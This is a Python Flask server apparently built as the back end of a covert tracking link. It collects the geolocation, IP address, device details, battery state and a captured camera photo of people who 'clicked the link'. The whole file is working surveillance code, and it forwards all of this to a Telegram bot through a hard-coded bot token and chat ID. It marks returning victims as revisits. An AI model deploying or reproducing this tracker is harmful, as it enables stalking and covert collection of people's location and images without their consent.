import os
import json
import requests
from flask import Flask, request

app = Flask(__name__)

# Telegram Bot Configuration
BOT_TOKEN = "7155229931:AAH0hS_AyT9waCCLAEmj9xCmpjE0oC9x3KE"
CHAT_ID = "7526005252"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# Store users who clicked the link
tracked_users = {}

def send_telegram_message(text):
    """Send text message to Telegram bot."""
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    requests.post(TELEGRAM_API, json=payload)

def send_telegram_photo(image_url, caption):
    """Send an image to Telegram bot."""
    payload = {"chat_id": CHAT_ID, "caption": caption, "photo": image_url}
    requests.post(TELEGRAM_PHOTO_API, json=payload)

@app.route('/track/<session_id>', methods=['POST'])
def track_device(session_id):
    """Track multiple users and send data to Telegram."""
    try:
        data = request.json
        battery = data.get("battery", {})
        geo = data.get("geo", {})
        device = data.get("device", {})
        photo = data.get("photo", None)

        # Check if user is already tracked
        user_ip = device.get("ip", "Unknown")
        if user_ip in tracked_users:
            message_status = "🔁 User revisited."
        else:
            message_status = "🆕 New User Clicked the Link!"
            tracked_users[user_ip] = session_id  # Store user IP and session

        # Format message
        message = f"""
<b>{message_status}</b>
📡 <b>Session ID:</b> {session_id}

⚡ <b>Battery:</b> {battery.get("level", "N/A")} (Charging: {battery.get("charging", "N/A")})
🌍 <b>Geolocation:</b> Lat {geo.get("latitude", "N/A")}, Lon {geo.get("longitude", "N/A")}
📱 <b>Device:</b> {device.get("platform", "N/A")}
💻 <b>Screen:</b> {device.get("screenWidth", "N/A")}x{device.get("screenHeight", "N/A")}
🌐 <b>IP Address:</b> {user_ip}
🖥 <b>User-Agent:</b> {device.get("userAgent", "N/A")}
🔌 <b>Cookies Enabled:</b> {device.get("cookiesEnabled", "N/A")}
🧩 <b>Plugins:</b> {device.get("plugins", "N/A")}
"""

        send_telegram_message(message)

        # Handle Photo
        if photo:
            send_telegram_photo(photo, "Captured Photo 📷")

        return {"status": "success"}, 200

    except Exception as e:
        return {"error": str(e)}, 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
